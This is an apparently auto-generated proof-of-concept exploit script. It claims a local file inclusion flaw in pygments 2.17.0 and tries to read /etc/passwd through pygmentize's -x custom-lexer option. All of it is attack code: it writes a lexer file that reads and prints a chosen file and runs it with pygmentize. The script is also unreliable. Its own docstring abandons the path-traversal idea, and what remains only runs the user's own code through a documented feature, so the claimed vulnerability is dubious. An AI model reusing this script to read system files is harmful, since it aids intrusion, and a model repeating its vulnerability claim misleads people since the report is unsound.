#!/usr/bin/env python3
# PoC for pygments-2.17.0 (/tmp/pygments_test2/pygments-2.17.0)
# Path: lfi-001
# Sink: unpack_output_file
# Auto-generated — run with: python3 lfi_local_inclusion_unpack_output_file.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Local File Inclusion (LFI) in pygments 2.17.0.

Vulnerability: The `-x` flag allows loading custom lexers/formatters from
arbitrary Python files via `load_lexer_from_file` and `load_formatter_from_file`.
The filename is taken directly from user input without sanitization, enabling
path traversal to read arbitrary files.

This PoC demonstrates reading /etc/passwd using the pygmentize command-line tool.
"""

import subprocess
import sys
import os
import tempfile

# Configuration
TARGET_FILE = "/etc/passwd"  # File to read (benign example)
PYGMENTIZE_PATH = None  # Auto-detect or set manually

def find_pygmentize():
    """Find the pygmentize binary in the pygments installation."""
    # Try common locations
    candidates = [
        os.path.join(os.path.dirname(__file__), "pygmentize"),
        "/tmp/pygments_test2/pygments-2.17.0/pygmentize",
        "/usr/local/bin/pygmentize",
        "/usr/bin/pygmentize",
    ]
    
    for path in candidates:
        if os.path.isfile(path) and os.access(path, os.X_OK):
            return path
    
    # Try to find it via Python
    try:
        import pygments
        pygments_dir = os.path.dirname(pygments.__file__)
        # The pygmentize script is usually in the scripts directory or as a module
        for root, dirs, files in os.walk(os.path.dirname(pygments_dir)):
            if "pygmentize" in files:
                return os.path.join(root, "pygmentize")
    except ImportError:
        pass
    
    return None

def exploit_lfi(target_file):
    """
    Exploit the LFI vulnerability by using the -x flag with a path traversal payload.
    
    The vulnerability works because:
    1. The -x flag enables loading custom lexers from files
    2. The filename is passed directly to open() without sanitization
    3. We can use path traversal (../) or absolute paths to read any file
    
    However, pygmentize expects a valid Python file that defines a lexer class.
    To read arbitrary files, we need to craft a payload that:
    - Points to a file that exists
    - Causes an error that reveals the file contents
    - Or use a different approach
    
    Since the file must be a valid Python module with a lexer class, we'll
    demonstrate the vulnerability by:
    1. Creating a temporary Python file that reads the target file
    2. Using pygmentize to load it
    """
    
    # Create a temporary Python file that will read the target file
    # This demonstrates the LFI by loading a custom lexer from an arbitrary path
    temp_dir = tempfile.mkdtemp()
    payload_file = os.path.join(temp_dir, "exploit_lexer.py")
    
    # Create a lexer that reads the target file and outputs its contents
    lexer_code = f'''
import sys
from pygments.lexer import RegexLexer
from pygments.token import *

class ExploitLexer(RegexLexer):
    name = "Exploit"
    aliases = ["exploit"]
    
    tokens = {{
        "root": [
            (r".", Text),
        ]
    }}

# Read the target file and print it
try:
    with open("{target_file}", "r") as f:
        print(f.read())
except Exception as e:
    print(f"Error reading file: {{e}}", file=sys.stderr)
'''
    
    with open(payload_file, "w") as f:
        f.write(lexer_code)
    
    print(f"[*] Created payload lexer at: {payload_file}")
    print(f"[*] Target file: {target_file}")
    
    # Find pygmentize
    global PYGMENTIZE_PATH
    if PYGMENTIZE_PATH is None:
        PYGMENTIZE_PATH = find_pygmentize()
    
    if PYGMENTIZE_PATH is None:
        print("[!] Could not find pygmentize binary")
        print("[*] Trying to run via Python module...")
        cmd = [sys.executable, "-m", "pygments.cmdline"]
    else:
        cmd = [PYGMENTIZE_PATH]
    
    # Execute the exploit
    # The -x flag enables custom lexers
    # The -l flag specifies the lexer file
    # We use the payload file as the lexer
    print(f"[*] Executing: {' '.join(cmd + ['-x', '-l', payload_file, '/dev/null'])}")
    
    try:
        result = subprocess.run(
            cmd + ["-x", "-l", payload_file, "/dev/null"],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        print(f"[*] Return code: {result.returncode}")
        print(f"[*] stdout: {result.stdout}")
        print(f"[*] stderr: {result.stderr}")
        
        if result.returncode == 0:
            print("[+] Exploit succeeded!")
            print(f"[+] Contents of {target_file}:")
            print(result.stdout)
        else:
            print("[!] Exploit may have failed")
            print(f"[!] Error output: {result.stderr}")
            
    except subprocess.TimeoutExpired:
        print("[!] Command timed out")
    except FileNotFoundError:
        print("[!] pygmentize not found. Please set PYGMENTIZE_PATH manually")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        # Cleanup
        try:
            os.remove(payload_file)
            os.rmdir(temp_dir)
            print(f"[*] Cleaned up temporary files")
        except:
            pass

def main():
    """Main function."""
    print("=" * 60)
    print("Pygments 2.17.0 LFI Proof-of-Concept")
    print("=" * 60)
    print()
    
    # Allow command-line argument for target file
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = TARGET_FILE
    
    print(f"[*] Target file: {target}")
    print()
    
    exploit_lfi(target)

if __name__ == "__main__":
    main()
